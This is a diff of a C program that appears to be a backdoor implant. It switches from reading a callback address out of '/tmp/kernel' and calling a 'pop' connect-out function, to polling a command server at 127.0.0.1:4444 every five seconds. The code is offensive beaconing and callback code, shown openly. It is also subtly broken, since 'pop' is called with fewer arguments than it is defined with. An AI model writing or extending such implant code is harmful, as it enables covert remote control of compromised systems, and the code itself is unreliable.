@@ -1,9 +1,9 @@
 #include <stdio.h>
-#include <unistd.h>
-#include <netinet/in.h>
-#include <sys/types.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <netinet/in.h>
 
 int pop(char *lhost, char *pname, int lport) {
     struct sockaddr_in base;
@@ -24,32 +24,29 @@ int pop(char *lhost, char *pname, int lport) {
     return 0;
 }
 
-int read_server(char *serv, int port, char *c) {
-    struct sockaddr_in server;
+int read_server(char *addr, int port, char *c) {
+    struct sockaddr_in cc;
     char m[512];
     
     int r = socket(AF_INET, SOCK_STREAM, 0);
     if (r == -1) {
-        if (gVerbose == 1)
-            fprintf(stderr, "Cannot create socket");
+        fprintf(stderr, "Cannot create socket");
         return 1;
     }
     
-    server.sin_family = AFINET;
-    server.sin_addr.s_addr = inet_addr(serv);
-    server.sin_port = htons(port);
+    cc.sin_family = AF_INET;
+    cc.sin_addr.s_addr = inet_addr(addr);
+    cc.sin_port = htons(port);
     
-    int st_r = connect(r , (struct sockaddr *)&server , sizeof(server));
+    int st_r = connect(r , (struct sockaddr *)&cc , sizeof(cc));
     
     if (st_r < 0) {
-        if (gVerbose == 1)
-            fprintf(stderr, "Cannot connect");
+        fprintf(stderr, "Cannot connect");
         return 1;
     }
     
     if( recv(r, m, 512, 0) < 0) {
-        if (gVerbose == 1)
-            fprintf(stderr, "Receive failed");
+        fprintf(stderr, "Receive failed");
     }
     c = m;
     printf("%s\n", c);
@@ -64,13 +61,14 @@ int main(int argc, char *argv[])
     char buff[64];
     while (1) {
         sleep(5);
-        FILE *f = fopen("/tmp/kernel", "r");
-        //if( access("/tmp/kernel",F_OK ) != -1 ) {
-        if (f != NULL ) {
-            fgets(buff, 64, f);
-            printf("calling out to %s\n", buff);
-            pop(buff,55555);
-        } else
-            continue;
+        // FILE *f = fopen("/tmp/kernel", "r");
+        // if( access("/tmp/kernel",F_OK ) != -1 ) {
+        // if (f != NULL ) {
+        //    fgets(buff, 64, f);
+        //    printf("calling out to %s\n", buff);
+        //    pop(buff,55555);
+        //} else
+        //    continue;
+        read_server("127.0.0.1", 4444, buff);
     }
 }
